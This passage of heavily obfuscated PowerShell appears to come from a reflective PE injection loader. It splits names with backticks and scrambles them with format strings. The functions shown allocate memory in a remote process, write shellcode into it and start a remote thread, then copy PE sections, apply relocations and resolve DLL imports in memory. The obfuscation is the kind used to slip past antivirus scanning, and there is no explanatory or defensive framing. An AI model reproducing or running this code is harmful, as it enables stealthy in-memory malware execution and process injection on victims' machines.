		${SCl`enG`Th} = ${G`e`Tpr`OCadDrEss`SC1}."lE`Ng`Th" + ${g`e`T`procAd`DrESss`c2}."l`e`NGth" + ${G`ETPr`O`Ca`DDr`esSsc3}."l`eNg`Th" + ${GEtprocaDd`R`E`sssc4}."LEN`gth" + ${GetPR`o`Ca`Dd`Re`Sssc5}."le`NgtH" + (${pT`R`SIZE} * 4)
		${scp`S`MEm} =   ${69`PB}::("{0}{3}{1}{2}" -f 'Allo','loba','l','cHG').Invoke(${S`cLEn`GTH})
		${scPSme`Mori`gIn`Al} = ${sC`PS`Mem}
		
		&("{1}{3}{0}{2}"-f'esTo','W','Memory','rite-Byt') -Bytes ${gETp`R`OC`ADDRE`SsS`C1} -MemoryAddress ${sCPs`M`Em}
		${Sc`pS`mem} = &("{1}{5}{6}{3}{4}{2}{7}{0}" -f 'ed','A','Unsi','ignedIntA','s','dd-','S','gn') ${ScP`SMem} (${ge`T`pro`ca`DDrESS`Sc1}."lE`N`Gth")
		 ( &("{0}{1}{2}"-f 'cH','Ildi','tEM')  ("{2}{3}{0}{1}"-f'le:6','9PB','vA','RIaB') )."val`Ue"::("{3}{1}{2}{0}" -f'Ptr','ur','eTo','Struct').Invoke(${re`moT`eDl`lha`NDle}, ${s`C`PSmEM}, ${F`AlSE})
		${S`cps`MeM} = &("{0}{4}{3}{1}{2}{5}{6}" -f 'Add-','n','edIntA','ig','S','sU','nsigned') ${sC`pSm`Em} (${PT`Rsi`zE})
		&("{1}{5}{4}{2}{0}{3}{6}" -f'Mem','Wr','To','or','ytes','ite-B','y') -Bytes ${GeTPRo`C`Ad`DRESSsc2} -MemoryAddress ${s`cpsMeM}
		${sCPs`MEm} = &("{0}{3}{1}{2}{4}"-f'Add-Signe','ntAsUnsi','gne','dI','d') ${S`CPSM`eM} (${GetpROCad`D`Res`ssc2}."lEn`g`TH")
		 ${69`pb}::("{2}{0}{1}{3}{4}"-f't','ruct','S','ureToP','tr').Invoke(${RFUN`CnaME`Ptr}, ${ScPS`meM}, ${fal`Se})
		${ScP`Sm`eM} = &("{0}{5}{3}{1}{2}{4}" -f'Add','n','tAsUnsigne','gnedI','d','-Si') ${S`CpsMeM} (${pt`RS`IZE})
		&("{2}{1}{3}{0}"-f 'ry','Bytes','Write-','ToMemo') -Bytes ${gE`TpROCa`d`D`ReS`Ssc3} -MemoryAddress ${sCP`SmeM}
		${S`CpS`MeM} = &("{1}{3}{2}{0}" -f'nedIntAsUnsigned','Ad','g','d-Si') ${sc`PsM`em} (${G`eTprOCADd`ReSS`SC3}."LEN`Gth")
		  ${6`9pB}::("{4}{3}{2}{0}{1}"-f'eT','oPtr','r','uctu','Str').Invoke(${GET`prOC`AdD`RE`ssAdDR}, ${s`CPs`MEm}, ${FAL`Se})
		${scpSM`Em} = &("{3}{0}{1}{2}"-f'dIntAsUns','ign','ed','Add-Signe') ${Sc`pSmEm} (${pTrSi`zE})
		&("{2}{3}{0}{5}{4}{1}"-f'esT','ry','Write','-Byt','Memo','o') -Bytes ${Ge`TPR`OCa`ddrEssSC4} -MemoryAddress ${Sc`PSM`EM}
		${S`c`PsmeM} = &("{6}{5}{4}{2}{0}{3}{1}" -f 's','signed','IntA','Un','d-Signed','d','A') ${S`C`psmem} (${gET`pR`Oc`AddRe`sSSc4}."l`en`gtH")
		  (  &("{0}{1}" -f'vaRIAb','Le') 69pb -vALueONl )::("{3}{0}{1}{4}{2}"-f'tru','ctureT','r','S','oPt').Invoke(${GE`TproCad`DrE`SsrET`meM}, ${s`cPs`mEm}, ${F`Al`se})
		${s`Cp`sMEm} = &("{1}{2}{0}{3}"-f'tA','Add-SignedI','n','sUnsigned') ${s`cP`smeM} (${P`Trs`ize})
		&("{5}{1}{0}{3}{2}{4}" -f'sT','-Byte','emor','oM','y','Write') -Bytes ${G`E`TpRoC`AddR`esS`sc5} -MemoryAddress ${s`cp`Smem}
		${S`CPSmem} = &("{0}{3}{1}{2}{4}"-f 'A','sUns','ig','dd-SignedIntA','ned') ${sC`P`sMEM} (${g`e`T`Pr`oCaddReSssC5}."Len`g`Th")
		
		${rsc`A`ddr} = ${WIn32`F`UnctionS}."VI`R`TUaLal`LOcEX"."in`VOkE"(${reMote`pr`OChA`N`dLe},   (&("{2}{1}{0}" -f 'ABle','i','GEt-VAR') ("{0}{1}" -f'2','M1AJ')  -vaLuEO)::"ze`Ro", [UIntPtr][UInt64]${scL`eNG`TH}, ${WI`N`32cOnSTA`NTS}."M`Em_COM`mit" -bor ${wIn`32co`NS`TAnTS}."MeM`_re`s`ERVE", ${WiN`3`2CONsTAn`TS}."PA`Ge_`eXEcuT`E_rEa`Dw`Ri`Te")
		if (${Rsc`Ad`DR} -eq   ${2`m`1aj}::"zE`RO")
		{
			Throw ("{10}{12}{0}{13}{7}{9}{6}{16}{2}{14}{3}{15}{5}{8}{1}{4}{11}" -f 'to a','r ','emot','pr','shellco','ces',' ','ory','s fo',' in','Unable','de',' ','llocate mem','e ','o','the r')
		}
		[UIntPtr]${NUM`ByTe`SWr`itT`en} =  (  &("{1}{0}{2}" -f'aRia','v','ble') ("{0}{1}" -f'v','1B')  -vALuE  )::"zE`Ro"
		${su`Cc`eSs} = ${wiN3`2FU`N`cTiONs}."wrI`TEp`Roc`esSMemOry"."iNV`OkE"(${R`EMOtEProcH`ANd`LE}, ${RSC`AD`dR}, ${sc`p`SME`mOriG`iNaL}, [UIntPtr][UInt64]${ScL`EnG`Th}, [Ref]${n`UmB`yTES`writteN})
		if ((${S`Ucce`sS} -eq ${F`AlsE}) -or ([UInt64]${NumB`yT`ESwRiT`TEN} -ne [UInt64]${sc`L`EnGtH}))
		{
			Throw ("{6}{7}{2}{10}{3}{12}{11}{9}{5}{1}{13}{8}{0}{4}"-f 'rocess memor','re','e sh','l','y.','o ','Unabl','e to writ','ote p','t','e','e ','lcod','m')
		}
		
		${rtH`ReaD`Ha`ND`Le} = &("{0}{6}{3}{2}{4}{1}{5}" -f 'C','hr','mote','ate-Re','T','ead','re') -ProcessHandle ${rem`oTEPRocH`AN`DLe} -StartAddress ${r`scadDr} -Win32Functions ${WIn32FUNct`I`oNS}
		${reS`U`lt} = ${W`iN32F`UN`cT`iOns}."W`Ai`TfORs`ingL`eObjECt"."iNv`O`KE"(${rt`hreaDha`N`Dle}, 20000)
		if (${RE`sulT} -ne 0)
		{
			Throw ("{10}{1}{6}{5}{3}{4}{2}{7}{9}{8}{0}"-f 'ddress failed.','l t','o ca','rea','d t','moteTh','o CreateRe','ll GetP','ocA','r','Cal')
		}
		
		
		[IntPtr]${r`EtURNV`ALM`Em} =  (&("{1}{2}{0}" -f'LE','GET-v','aRiaB')  69PB -VALuEo )::("{0}{2}{1}" -f'A','lobal','llocHG').Invoke(${PTR`sIZE})
		${rEs`U`lt} = ${WI`N32funcTI`O`NS}."ReAd`pRoCE`SsME`M`orY"."i`Nvo`Ke"(${rEMOTep`Ro`C`hAn`DlE}, ${GeT`Pr`oc`AddrEsS`ReTMEm}, ${rEturnvAl`m`em}, [UIntPtr][UInt64]${P`Trsi`Ze}, [Ref]${numB`Y`TeSwRitt`eN})
		if ((${RE`Su`Lt} -eq ${F`Al`sE}) -or (${nUm`B`YtEsWrItTen} -eq 0))
		{
			Throw ("{3}{4}{7}{2}{1}{6}{0}{5}"-f 'ssMemory fail','dPro','Rea','Call ','to','ed','ce',' ')
		}
		[IntPtr]${p`RoCADD`ReSS} =   (&("{0}{1}{2}" -f'GE','t-VarIa','BLE')  ('6'+'9Pb') -valueON)::"pt`RT`OStRuctU`RE"(${Ret`UrNVa`L`MEM}, [Type][IntPtr])

        
		${W`IN32f`Unc`T`IoNs}."v`IR`TUAlfRe`EEx"."I`NvOKE"(${Re`Mo`Te`prOChanDle}, ${r`Sc`ADdR}, [UIntPtr][UInt64]0, ${W`i`N32`C`OnstanTS}."m`E`M`_reLeaSE") | &("{1}{0}{2}" -f 't-Nu','Ou','ll')
		${WI`N3`2`FUNCtI`onS}."vIRtU`A`lFrE`EEx"."iNV`o`KE"(${ReM`otePrO`C`hAnDle}, ${G`Et`pROca`dD`REs`sr`EtMEM}, [UIntPtr][UInt64]0, ${wiN3`2Co`NstA`NtS}."m`em_rE`lEase") | &("{0}{1}"-f'Out','-Null')

        if (-not ${L`oAdB`yoRdinAL})
        {
            ${wI`N3`2fU`NCTIOns}."vi`Rt`UaLfRE`e`EX"."IN`VO`ke"(${r`EM`oTEP`R`ocHAndLe}, ${RFun`cNA`mEPTR}, [UIntPtr][UInt64]0, ${W`iN32con`S`T`AnTS}."Me`M_relE`ASE") | &("{0}{1}{2}" -f'Out','-N','ull')
        }
		
		return ${P`Ro`c`AddRESS}
	}


	Function C`O`p`Y-sECtions
	{
		Param(
		[Parameter(positIoN = 0, MANDatoRY = ${T`RuE})]
		[Byte[]]
		${PEb`Yt`es},
		
		[Parameter(POsITion = 1, manDaTory = ${TR`Ue})]
		[System.Object]
		${Pe`iNfO},
		
		[Parameter(pOSItiOn = 2, MAnDATOrY = ${T`RUE})]
		[System.Object]
		${WiN`32FUn`C`TIoNs},
		
		[Parameter(PoSITiOn = 3, mAnDatORY = ${Tr`UE})]
		[System.Object]
		${w`In`32T`YPES}
		)
		
		for( ${i} = 0; ${I} -lt ${Pei`Nfo}."i`ma`Ge_Nt_`hEa`DErS"."Fi`leHeAd`er"."Numb`E`RoFseCt`Ions"; ${I}++)
		{
			[IntPtr]${SeCt`IoN`hEAd`E`RP`Tr} = [IntPtr](&("{0}{4}{3}{2}{1}" -f'Add-Sig','tAsUnsigned','In','d','ne') ([Int64]${p`E`InFo}."S`ectI`ON`hEAde`R`PtR") (${i} *  (  &("{2}{0}{1}"-f 'et-i','tem','G')  ('variA'+'Ble'+':'+'69Pb'))."v`AlUe"::"s`IZ`eOF"([Type]${w`IN`32t`yPeS}."imAge_s`e`c`TI`ON_`header")))
			${sec`Ti`oNHEAdeR} =   ${69`pb}::"p`T`RTOsTRUc`T`URE"(${S`e`ctIo`N`hEaDeR`PtR}, [Type]${Win`32T`Yp`ES}."iMaGE`_sEcT`ion`_HeadeR")
		
			
			[IntPtr]${SE`c`TiOnDe`STA`dDR} = [IntPtr](&("{1}{3}{2}{0}{4}" -f'sUnsign','Add','IntA','-Signed','ed') ([Int64]${pE`INFO}."peH`AN`dlE") ([Int64]${Sec`Tion`he`AdeR}."v`IRTu`AlA`DD`ReSs"))
			
			
			
			
			
			${Si`zEOf`RaWDaTA} = ${SeCT`Ionh`eaDER}."sIz`EOFrAW`daTA"

			if (${s`E`cTIOnhe`Ad`er}."P`OI`NTerT`OraWdA`TA" -eq 0)
			{
				${Si`z`EoFra`Wda`TA} = 0
			}
			
			if (${sIz`eOfRA`Wd`AtA} -gt ${sEcT`IONH`EaD`er}."V`irtuAlsi`ZE")
			{
				${SIZ`E`ofRa`w`DATa} = ${sE`ctionH`E`A`DeR}."Vi`RTUAL`SI`ze"
			}
			
			if (${Siz`eO`FRa`wdA`TA} -gt 0)
			{
				&("{3}{2}{4}{1}{0}{5}" -f'eVa','moryRang','st-','Te','Me','lid') -DebugString ("{5}{1}{2}{0}{6}{3}{4}"-f'sha','Sections::Ma','r','C','opy','Copy-','l') -PEInfo ${Pe`I`NfO} -StartAddress ${SE`ct`ionDeS`TA`ddR} -Size ${Sizeo`FR`AW`d`AtA} | &("{1}{0}{2}"-f'ut','O','-Null')
				 ( &("{0}{1}"-f 'Di','r') ("vA"+"ria"+"BLE"+":69"+"Pb"))."v`ALUe"::"c`oPY"(${Peb`Ytes}, [Int32]${s`ECtI`o`NHEader}."pOiN`TeRt`OrAwD`ATA", ${S`ecT`IONdE`sTA`dDR}, ${SIZ`eOfr`Awda`Ta})
			}
		
			
			if (${Se`Cti`OnheA`der}."sIZ`eoF`RAW`DatA" -lt ${sEct`iO`NHE`AdER}."vIrT`UalSi`ZE")
			{
				${D`i`FFeREnce} = ${S`E`CtION`HeaDeR}."vIRtu`Al`sIze" - ${SI`zEOf`RA`Wd`ATa}
				[IntPtr]${S`TarTAD`dRe`Ss} = [IntPtr](&("{3}{0}{1}{2}{4}" -f 'igned','In','tAsUns','Add-S','igned') ([Int64]${s`ECtIoND`ESt`ADdr}) ([Int64]${SI`zEofR`A`wd`ATA}))
				&("{3}{2}{5}{6}{1}{0}{4}"-f 'ge','n','t','Tes','Valid','-Mem','oryRa') -DebugString ("{0}{4}{1}{3}{2}"-f 'Cop','ctions:','Memset',':','y-Se') -PEInfo ${P`Ei`NFO} -StartAddress ${StaR`TadDr`Ess} -Size ${dI`FFE`RENcE} | &("{1}{0}"-f '-Null','Out')
				${WIn32fun`cTIO`NS}."me`MsEt"."iN`VO`ke"(${sTart`Addr`ESS}, 0, [IntPtr]${dIF`FERen`CE}) | &("{1}{0}"-f 'l','Out-Nul')
			}
		}
	}


	Function UPdATE-`memo`R`Y`AD`DResSes
	{
		Param(
		[Parameter(poSITioN = 0, MaNDatOrY = ${tR`Ue})]
		[System.Object]
		${Pe`In`FO},
		
		[Parameter(POsiTION = 1, mANdaTOrY = ${tr`UE})]
		[Int64]
		${Or`iGINA`l`iMa`geBASe},
		
		[Parameter(posiTion = 2, maNDAtORY = ${TR`UE})]
		[System.Object]
		${wiN32`Cons`Ta`Nts},
		
		[Parameter(POsITiOn = 3, mAndAtOrY = ${TR`UE})]
		[System.Object]
		${WI`N32t`yp`Es}
		)
		
		[Int64]${Ba`S`edIffEr`encE} = 0
		${add`D`i`Ffe`Rence} = ${T`RUE} 
		[UInt32]${i`MaGEbaS`erE`LO`cSizE} =  ${69`PB}::"SI`zeof"([Type]${wIN32T`y`p`eS}."I`MAGe_BAS`e_RE`L`OCATi`on")
		
		
		if ((${oRig`iNA`lima`g`e`Base} -eq [Int64]${pe`i`NfO}."EfF`E`CtivEP`EhandlE") `
				-or (${p`e`Info}."imAG`E_nT`_hea`d`ERS"."oPt`i`oNAlHeaDer"."ba`SereloCaT`ion`Tab`Le"."S`iZE" -eq 0))
		{
			return
		}


		elseif ((&("{6}{2}{0}{7}{8}{4}{3}{1}{5}" -f'p','rTha','om','te','ea','nVal2AsUInt','C','are-Va','l1Gr') (${OriG`INa`li`MaG`eBASe}) (${pei`N`Fo}."e`FFEct`Iv`epehandlE")) -eq ${T`RUE})
		{
			${BaS`E`diFFEREncE} = &("{3}{2}{0}{1}" -f 'nt','AsUnsigned','SignedI','Sub-') (${O`RI`GinAliM`AGE`BaSE}) (${PeiN`FO}."EFfEC`Ti`VepeH`A`N`dLe")
			${aDdD`i`FFeREn`cE} = ${fa`L`sE}
		}
		elseif ((&("{6}{8}{5}{1}{7}{3}{0}{2}{4}" -f'al','V','2As','GreaterThanV','UInt','mpare-','C','al1','o') (${peI`N`FO}."E`Ffe`CTIVEpehAN`DLE") (${ORI`Gi`N`AlIMag`EBA`SE})) -eq ${T`Rue})
		{
			${BAsED`i`FfeR`e`Nce} = &("{2}{1}{0}{3}{4}"-f't','b-SignedIn','Su','AsUnsign','ed') (${p`eiN`FO}."eFfE`c`TIVePehAn`dLE") (${O`R`igin`Al`IM`AGEbAsE})
		}
		
		
		[IntPtr]${BaS`eR`E`l`oCPtr} = [IntPtr](&("{4}{0}{2}{5}{3}{1}{6}"-f 'd','signe','d-','sUn','A','SignedIntA','d') ([Int64]${PeIN`Fo}."peH`A`NDlE") ([Int64]${pEI`Nfo}."Im`AgE_`NT_hE`ADERS"."opTION`AlHe`A`dER"."ba`s`ERELOC`At`iO`N`TABle"."vIR`TuA`LADDRESS"))
		while(${t`Rue})
		{
			
			${bAse`R`el`oCATIo`Nt`AbLE} =  (&("{1}{0}"-f 'i','Gc') ("vARIAbL"+"e:"+"69"+"pB")  )."vA`LuE"::"ptr`T`oStRUc`TurE"(${baSErEL`O`Cp`Tr}, [Type]${w`in32`TYp`eS}."IMAGE_b`A`s`e_`RElO`cAT`IoN")

			if (${b`A`s`erE`lOCatioNTa`Ble}."s`iZEOf`Block" -eq 0)
			{
				break
			}

			[IntPtr]${me`MA`DDRBaSe} = [IntPtr](&("{3}{0}{7}{1}{4}{6}{5}{2}"-f 'd-S','ne','sUnsigned','Ad','dI','A','nt','ig') ([Int64]${Pe`in`Fo}."P`EHa`Ndle") ([Int64]${b`A`SEre`lOCat`IO`Nta`BLE}."vIr`Tuala`Dd`ResS"))
			${nu`mreLOC`AtiONs} = (${basERel`OcA`T`io`Nt`ABle}."SI`zeoFbL`OcK" - ${I`mage`BASeR`ElOcsI`Ze}) / 2

			
			for(${i} = 0; ${i} -lt ${NU`m`R`ElOcAtIO`NS}; ${i}++)
			{
				
				${RElocA`T`iONiN`FoPtr} = [IntPtr](&("{6}{1}{4}{2}{3}{0}{5}{7}" -f'si','dd','Int','AsUn','-Signed','gne','A','d') ([IntPtr]${b`A`seRelO`cPTr}) ([Int64]${i`MaGebasER`EL`oCsIze} + (2 * ${i})))
				[UInt16]${Re`LOC`ATIONin`FO} =  ${69`pB}::"pt`RToS`Tru`CtuRE"(${r`ElO`cATiOninF`OP`Tr}, [Type][UInt16])

				
				[UInt16]${ReLoC`oFFS`eT} = ${ReLoca`TIOn`in`FO} -band 0x0FFF
				[UInt16]${R`elOct`ype} = ${Rel`Oc`AT`Ion`INFo} -band 0xF000
				for (${J} = 0; ${J} -lt 12; ${j}++)
				{
					${R`ELo`CTYPE} =   (&("{0}{1}"-f'dI','R')  ("{0}{2}{1}"-f 'VArIab',':701TK','lE')  )."vaL`UE"::("{0}{1}"-f 'Flo','or').Invoke(${Rel`oc`TyPe} / 2)
				}

				
				
				
				if ((${re`LOctY`pe} -eq ${WI`N3`2coN`STan`Ts}."IMaGE`_rel_Base`D_`highloW") `
						-or (${r`eloCty`pe} -eq ${wiN`32COnStA`Nts}."Im`AGE_REl_bas`eD_`di`R`64"))
				{			
					
					[IntPtr]${f`I`NaLadDR} = [IntPtr](&("{0}{4}{1}{5}{2}{3}{6}" -f'Add','ign','dInt','As','-S','e','Unsigned') ([Int64]${M`Em`Ad`dRBaSe}) ([Int64]${rE`LoCOF`FSet}))
					[IntPtr]${c`U`Rr`ADDr} =  ${69`Pb}::"P`TRtoS`Tr`UCTurE"(${F`INal`ADDR}, [Type][IntPtr])
		
					if (${ADddIff`E`R`En`Ce} -eq ${t`RUE})
					{
						[IntPtr]${c`URRadDr} = [IntPtr](&("{2}{6}{1}{5}{4}{0}{3}" -f'si','gn','Add','gned','Un','edIntAs','-Si') ([Int64]${C`Ur`RadDR}) (${B`Ase`DifferE`N`CE}))
					}
					else
					{
						[IntPtr]${c`Urra`ddR} = [IntPtr](&("{0}{1}{3}{4}{2}"-f'Su','b-Signe','signed','dIntAsU','n') ([Int64]${cu`R`RaDDR}) (${B`ASEdIf`Fer`en`cE}))
					}				

					  (  &("{0}{1}"-f 'VA','RIable')  ("6"+"9PB") -ValueoN )::("{4}{0}{2}{1}{3}"-f'u','ToP','re','tr','Struct').Invoke(${C`UR`RaddR}, ${FINA`l`Ad`dR}, ${FAl`Se}) | &("{2}{1}{0}"-f 'ull','ut-N','O')
				}
				elseif (${REl`oc`TypE} -ne ${w`In32`C`oNs`TAnts}."IMA`G`e_r`eL_B`A`sed_abs`oLute")
				{
					
					Throw ('Un'+'known'+' '+'reloca'+'tio'+'n '+'fo'+'und,'+' '+'relo'+'cation'+' '+'v'+'al'+'ue: '+"$RelocType, "+'relo'+'c'+'ationinfo'+': '+"$RelocationInfo")
				}
			}
			
			${basere`lO`cp`Tr} = [IntPtr](&("{1}{3}{4}{0}{2}"-f 'nt','A','AsUnsigned','d','d-SignedI') ([Int64]${BaSereL`OcP`Tr}) ([Int64]${Ba`sE`REl`OCATi`oNtabLE}."S`IZEoFbL`ocK"))
		}
	}


	Function iM`pOrt-DlL`IM`PoR`Ts
	{
		Param(
		[Parameter(poSiTIon = 0, MAndaTORY = ${tr`Ue})]
		[System.Object]
		${P`EinFo},
		
		[Parameter(pOsitIon = 1, mAndATory = ${t`RuE})]
		[System.Object]
		${Wi`N`3`2FUNCt`IonS},
		
		[Parameter(pOsitIOn = 2, mAnDAtory = ${tR`Ue})]
		[System.Object]
		${wi`N3`2`TyPEs},
		
		[Parameter(POSitIon = 3, ManDAtoRY = ${tR`Ue})]
		[System.Object]
		${WIN3`2c`ONStAN`Ts},
		
		[Parameter(posiTiON = 4, ManDatorY = ${FA`L`SE})]
		[IntPtr]
		${RemOt`EPr`OCH`ANDLE}
		)
		
		${R`e`MOTe`LoAdING} = ${FA`lsE}
		if (${peI`Nfo}."P`Eh`ANdLe" -ne ${pE`iNFo}."Ef`Fe`c`Ti`VepeHAN`DLe")
		{
			${r`E`mOt`E`lOAdiNG} = ${Tr`UE}
		}
		
		if (${p`Ein`FO}."iMA`ge`_Nt_he`AdERs"."OP`TiOnALHE`ADer"."i`MP`ort`TABlE"."s`IZe" -gt 0)
		{
			[IntPtr]${impOr`T`DEs`CripTOR`Ptr} = &("{2}{0}{5}{4}{3}{1}" -f '-Signed','ed','Add','gn','ntAsUnsi','I') ([Int64]${p`EIN`FO}."p`EhAn`dlE") ([Int64]${pE`I`NFo}."i`mAge_NT_`H`eAdeRs"."o`P`TIoNAlh`Eader"."IMP`oRTTA`BLe"."Vi`Rt`UALaDdR`EsS")
			
			while (${T`RuE})
			{
				${I`mpOrtdes`Crip`ToR} =  (  &("{1}{0}{2}" -f 'IA','vaR','bLE') 69PB)."vAl`UE"::"ptRtoSTR`U`cT`UrE"(${iMP`o`RtdeSC`Rip`To`RPTr}, [Type]${W`In32`TYpES}."Im`Age_imPo`Rt_d`E`scRip`T`oR")
				
				
				if (${Imp`ORtD`Es`C`RIPTOr}."cH`ARa`C`Te`RIStiCS" -eq 0 `
						-and ${iM`POr`TDESC`RiP`TOr}."firST`T`HU`NK" -eq 0 `
						-and ${impO`RtDe`Sc`R`IpTOr}."fOr`wa`RdErchA`IN" -eq 0 `
						-and ${imPORTDE`sc`Rip`TOr}."nA`mE" -eq 0 `
						-and ${iMPoR`T`De`sc`RiPTOr}."t`iME`daTeSTa`MP" -eq 0)
				{
					&("{0}{4}{3}{2}{1}"-f'Wri','ose','rb','e','te-V') ("{2}{3}{0}{5}{4}{6}{1}"-f'o','rts','Do','ne imp','DLL im','rting ','po')
					break
				}

				${IM`POrTd`LLh`AN`dle} =  (&("{2}{1}{0}" -f'blE','rIa','vA') ("{0}{1}"-f'2m1','aj')  -VALuEoNL)::"Ze`Ro"
				${I`M`PORtdlLPATh`P`TR} = (&("{1}{0}{2}{5}{4}{3}" -f 'gnedIn','Add-Si','t','Unsigned','s','A') ([Int64]${Pe`infO}."peH`A`Ndle") ([Int64]${i`mPortdE`sCR`ipT`or}."NA`me"))
				${im`pOr`TdlLpath} =   (&('gi')  ("{3}{2}{0}{1}" -f'69p','b',':','variABlE') )."V`AlUe"::("{0}{2}{3}{1}"-f'PtrT','ringAnsi','o','St').Invoke(${im`poR`TDllPA`T`hPTR})
				
				if (${R`EMotELOA`dIng} -eq ${T`Rue})
				{
					${IMp`orTD`ll`hA`N`dLe} = &("{4}{2}{3}{1}{0}" -f 'rocess','emoteP','In','R','Import-Dll') -RemoteProcHandle ${r`E`mo`T`epRoCHAndLE} -ImportDllPathPtr ${ImpoRT`D`L`LPatHp`TR}
				}
				else
				{
					${iMpORtD`LLH`A`N`dle} = ${Win3`2`FU`NCti`Ons}."lO`Ad`Lib`RArY"."InVO`KE"(${impor`Td`l`LP`Ath})
				}

				if ((${IMportdl`LH`ANd`lE} -eq ${N`Ull}) -or (${imPort`DllHA`Ndle} -eq   ( &("{0}{1}{2}"-f'vARiA','b','Le') ("{1}{0}"-f 'J','2M1A')  )."VAL`Ue"::"z`erO"))
				{
					throw ('Erro'+'r '+'impor'+'ting'+' '+'DLL'+', '+'DLLNa'+'me'+':'+' '+"$ImportDllPath")
				}
				
				
				[IntPtr]${tHUNK`R`EF} = &("{3}{2}{0}{1}{4}" -f 'i','g','dd-SignedIntAsUns','A','ned') (${pein`Fo}."PEhAn`dLE") (${i`MpoRt`deScRI`PToR}."f`iRstT`Hu`NK")
				[IntPtr]${oRIGi`Na`LT`Hu`NKREF} = &("{5}{4}{6}{1}{2}{0}{3}"-f'sUnsi','nt','A','gned','gn','Add-Si','edI') (${p`EINFO}."peHAN`DlE") (${ImpOrt`d`E`SCR`iPTor}."Chara`c`T`eRisT`iCs") 
				[IntPtr]${oRiG`iN`ALT`hunkrE`FVal} =  ( &("{2}{1}{0}"-f 'tEM','i','geT-') ("{0}{2}{1}"-f'v','e:69pB','aRiAbL')  )."Val`Ue"::"Ptrto`StrUC`T`URE"(${orI`gi`NaLtH`UNK`Ref}, [Type][IntPtr])
				
				while (${O`R`IgIN`ALThUNk`RE`FVaL} -ne  (  &("{3}{1}{0}{2}" -f'E','-ChildIT','M','GeT') ("{0}{1}{3}{2}" -f'VARiABlE',':2','1AJ','m'))."V`ALue"::"z`Ero")
				{
                    ${lO`ADBY`Or`di`NAL} = ${fA`L`se}
                    [IntPtr]${PRo`c`EDuRenamEP`TR} =  ( &('GI')  ("{1}{0}{2}{3}"-f'riaBLE:','Va','2','M1Aj') )."Va`lUe"::"Z`erO"
					
					
					
					[IntPtr]${NEWT`hun`Kr`Ef} =  ( &('gI') ("VA"+"RiaBle:2"+"m1AJ") )."val`Ue"::"ze`Ro"
					if(  ${6`9pb}::"sizE`oF"([Type][IntPtr]) -eq 4 -and [Int32]${oR`igInAl`ThuNkRe`FvaL} -lt 0)
					{
						[IntPtr]${PR`OCED`Ur`EnaMepTr} = [IntPtr]${oRiginAl`TH`Unk`Ref`V`AL} -band 0xffff 
                        ${lOA`d`ByO`RDiNaL} = ${tr`UE}
					}
                    elseif(  ${6`9pb}::"SiZe`of"([Type][IntPtr]) -eq 8 -and [Int64]${OriGin`Alt`HuNKrE`F`VAl} -lt 0)
					{
						[IntPtr]${PR`o`cEdU`ReNAm`ep`TR} = [Int64]${ORIGi`NAlTHuNk`R`efVaL} -band 0xffff 
                        ${L`O`ADbyO`Rd`INAL} = ${tr`Ue}
					}
					else
					{
						[IntPtr]${StR`inGAd`dR} = &("{5}{4}{1}{3}{0}{2}" -f'sign','nedIntAs','ed','Un','d-Sig','Ad') (${Pe`Info}."PEhA`NDlE") (${Or`igina`L`T`hUNKrE`FVaL})
						${Str`iN`ga`Ddr} = &("{2}{0}{3}{1}"-f 'AsUns','ed','Add-SignedInt','ign') ${Stri`NgAD`dR} (  ${6`9Pb}::"siZe`OF"([Type][UInt16]))
						${PRO`CedURE`NA`ME} =   ( &('Ls') ("VariABLe"+":6"+"9"+"pB"))."Va`luE"::("{3}{0}{1}{2}"-f 'trTo','StringA','nsi','P').Invoke(${St`RIN`gADdr})
                        ${P`ROc`ed`UrE`NamEPtr} =   (  &("{0}{1}" -f 'G','cI') ("VARIA"+"bLE:"+"69Pb")  )."Val`Ue"::("{4}{0}{5}{1}{3}{2}" -f'T','G','i','lobalAns','String','oH').Invoke(${Pr`ocE`durENAmE})
					}
					
					if (${rE`MOteLO`AD`ING} -eq ${t`RUe})
					{
						[IntPtr]${nE`wT`hun`kREF} = &("{0}{3}{1}{4}{2}"-f 'Ge','RemoteP','ss','t-','rocAddre') -RemoteProcHandle ${r`EmO`Te`PR`oCHa`NdLe} -RemoteDllHandle ${I`Mpo`RtDl`Lha`Nd`LE} -FunctionNamePtr ${p`R`o`C`EduR`EnaMePtR} -LoadByOrdinal ${LoaD`B`YOrdInal}
					}
					else
					{
				        [IntPtr]${N`ewthUnkr`Ef} = ${w`In32f`UNCtIONS}."geTproC`AdD`R`eS`sINTPTR"."i`NVoKe"(${i`MpoRt`dLL`hAN`Dle}, ${proced`U`Re`NAM`Eptr})
					}
					
					if (${N`E`wthUNkr`Ef} -eq ${N`ULl} -or ${nE`wT`hun`KREf} -eq  ${2`M1`Aj}::"ze`RO")
					{
                        if (${LO`AdbY`orDINAL})
                        {
                            Throw ('N'+'ew '+'functi'+'on '+'refe'+'re'+'nce '+'is'+' '+'nu'+'ll, '+'t'+'his '+'i'+'s '+'almos'+'t '+'c'+'e'+'rtainly'+' '+'a '+'bu'+'g '+'i'+'n '+'t'+'his '+'sc'+'r'+'ipt. '+'Functi'+'o'+'n '+'Ordi'+'nal'+': '+"$ProcedureNamePtr. "+'Dll:'+' '+"$ImportDllPath")
                        }
                        else
                        {
						    Throw ('New'+' '+'fun'+'ct'+'ion '+'refer'+'ence'+' '+'i'+'s '+'null'+', '+'th'+'is '+'i'+'s '+'a'+'lm'+'ost '+'cer'+'ta'+'inly '+'a '+'bu'+'g '+'i'+'n '+'this'+' '+'scrip'+'t. '+'Fun'+'cti'+'on: '+"$ProcedureName. "+'Dl'+'l: '+"$ImportDllPath")
                        }
					}

					 (  &("{1}{0}"-f 'e','VaRiabL')  69pb )."v`AlUE"::("{3}{1}{0}{2}"-f 'reT','u','oPtr','Struct').Invoke(${ne`WtHuN`KrEf}, ${THu`NKrEf}, ${f`ALse})
					
					${T`HunkR`Ef} = &("{2}{3}{0}{1}{6}{5}{4}"-f '-Signed','I','A','dd','ned','tAsUnsig','n') ([Int64]${tH`UNK`REF}) (  (  &("{0}{1}{2}"-f 'ge','t-VariABl','e') 69PB  )."Va`LuE"::"s`izEOf"([Type][IntPtr]))
					[IntPtr]${oR`igIn`A`lThuNKr`EF} = &("{2}{1}{4}{0}{3}" -f'tAsUnsig','igne','Add-S','ned','dIn') ([Int64]${o`R`i`Gi`NaLt`HuNkREf}) ( (&('LS') ('VA'+'ri'+'a'+'B'+'lE:69Pb')  )."VA`lue"::"sIze`Of"([Type][IntPtr]))
					[IntPtr]${OrI`G`ina`L`ThuN`KREfVAl} =   ${69`pB}::"pTR`TosT`RuC`TuRE"(${oRiGiNaLTh`U`N`k`REf}, [Type][IntPtr])

                    
                    
